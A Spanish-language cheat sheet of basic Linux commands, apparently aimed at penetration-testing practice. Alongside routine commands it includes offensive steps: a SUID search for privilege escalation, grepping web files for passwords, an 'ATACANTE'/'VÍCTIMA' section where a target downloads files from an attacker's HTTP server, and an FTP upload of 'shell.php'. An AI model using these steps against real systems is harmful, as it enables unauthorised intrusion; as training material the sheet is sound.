---
title: Comandos Básicos Linux
pubDate: '2025-09-30'
---

## Índice
- [Recolectar información](#recolectar)
- [Usuarios y grupos](#usuarios_grupos)
- [Operaciones con ficheros](#ficheros)
- [Permisos de ficheros](#ficheros_permisos)
- [Stdin, Stdout, Stderr](#stdin)
- [Variables y Alias](#var)
- [Concatenación](#concat)
- [Búsqueda Estratégica](#bus)
- [SSH e Identidad](#ssh)
- [Networking](#net)
- [Transferencia de Ficheros](#comp)
- [FTP](#ftp)
- [Compresión y Descompresión](#tar)
- [Regex y Manipulación de Texto](#regex)
- [SQL Básico](#sql)

<a name="recolectar"></a>
## Recolectar información (Enumeración inicial)
```bash
# Información del kernel y sistema (Busca exploits de kernel)
uname -a
# Versión de la distribución (ej: Ubuntu 20.04)
cat /etc/os-release

# Identidad del usuario y grupos (Vigila grupos como lxd, docker, sudo)
whoami
id

# Red local
hostname -I      # IP privada
arp -a           # Tabla ARP (dispositivos en la misma red)

# Procesos y servicios
ps aux           # Listado de todos los procesos
top              # Procesos en tiempo real
ss -tunlp        # Puertos abiertos y servicios asociados (alternativa a netstat)

# Almacenamiento
df -h            # Espacio libre
lsblk            # Dispositivos de bloque y particiones
```

<a name="usuarios_grupos"></a>
## Usuarios y grupos
```bash
groupadd [grupo]        # Crear grupo
useradd -m [usuario]    # Crear usuario con home
usermod -aG sudo [user] # Añadir usuario al grupo sudo
passwd [usuario]        # Cambiar contraseña
```

<a name="ficheros"></a>
## Operaciones con ficheros
```bash
ls -la           # Listar todo (incluyendo ocultos) con detalle
tree -L 2        # Ver árbol de directorios hasta nivel 2
ln -s [fichero] [enlace] # Crear enlace simbólico (acceso rápido)
rm -rf [dir]     # Borrar directorio y contenido de forma recursiva y forzada
```

<a name="ficheros_permisos"></a>
## Permisos de ficheros
```bash
chmod 600 id_rsa         # Permisos recomendados para llaves SSH
chmod +x script.sh       # Hacer un script ejecutable
chown user:group file    # Cambiar dueño y grupo simultáneamente
```

<a name="stdin"></a>
## Stdin | Stdout | Stderr
*   `0`: Entrada estándar (teclado)
*   `1`: Salida estándar (pantalla)
*   `2`: Salida de errores

```bash
comando 2>/dev/null      # Ocultar errores (útil en find)
comando > output.txt 2>&1 # Guardar salida y errores en el mismo archivo
comando &                # Ejecutar en segundo plano (background)
disown                   # Mantener el proceso si cerramos la terminal
```

<a name="var"></a>
## Variables Bash y Alias
```bash
export NAME="valor"      # Definir variable de entorno
alias ll='ls -la'        # Crear atajo de comando
echo $PATH               # Ver rutas de binarios del sistema
```

<a name="concat"></a>
## Concatenación
```bash
comando1 ; comando2      # Ejecuta uno tras otro
comando1 && comando2     # Ejecuta el 2º solo si el 1º tiene éxito
comando1 || comando2     # Ejecuta el 2º solo si el 1º falla
comando1 | comando2      # Pasa la salida de uno como entrada del otro
```

<a name="bus"></a>
## Búsqueda Estratégica
```bash
# BUSCAR ARCHIVOS SUID (Escalada de privilegios)
find / -perm -4000 -ls 2>/dev/null

# Buscar archivos modificados en los últimos 10 minutos
find / -mmin -10 2>/dev/null

# Buscar una cadena en archivos (ignorando mayúsculas)
grep -ri "password" /var/www/html

# Localizar binarios
which nmap
whereis python
```

<a name="ssh"></a>
## SSH e Identidad
```bash
ssh user@host -p 22      # Conexión básica
ssh user@host -i id_rsa  # Conexión usando llave privada

# Copiar archivos por SCP
scp file.txt user@host:/tmp/      # Subir
scp user@host:/tmp/file.txt .     # Descargar
```

<a name="net"></a>
## Networking
```bash
ip a                     # Ver interfaces e IPs
netstat -tunlp           # Ver puertos escuchando (requiere net-tools)
ss -tunlp                # Ver puertos escuchando (más moderno)
curl ifconfig.me         # Ver tu IP pública
```

<a name="comp"></a>
## Transferencia de Ficheros
```bash
# ATACANTE: Montar servidor HTTP rápido
python3 -m http.server 80

# VÍCTIMA: Descargar recurso
wget http://<ip_atacante>/recurso
curl http://<ip_atacante>/recurso -o recurso
```

<a name="ftp"></a>
## FTP
```bash
ftp <ip>
# Una vez dentro:
binary                   # Cambiar a modo binario (para evitar corrupción de datos)
get file.exe             # Descargar
put shell.php            # Subir
```

<a name="tar"></a>
## Compresión y Descompresión
```bash
# TAR (Linux standard)
tar -cvf archivo.tar dir/      # Comprimir
tar -xvf archivo.tar           # Descomprimir
tar -ztvf archivo.tar.gz       # Listar contenido sin extraer

# GZIP
gzip archivo.txt               # Comprime (borra el original)
gunzip archivo.gz              # Descomprime
```

<a name="regex"></a>
## Regex y Manipulación de Texto
```bash
# Extraer la primera columna (útil para listar usuarios de /etc/passwd)
cat /etc/passwd | cut -d ':' -f 1

# Filtrar con AWK (Imprimir columna 2)
ls -l | awk '{print $2}'

# Reemplazar texto con SED
sed -i 's/antiguo/nuevo/g' file.txt
```

<a name="sql"></a>
## SQL Básico
```bash
# Conexión a MySQL (Nota: sin espacio después de -p)
mysql -u root -p'password123' -h 10.10.10.10

# Consultas útiles
show databases;
use <nombre_db>;
show tables;
select * from users;
```
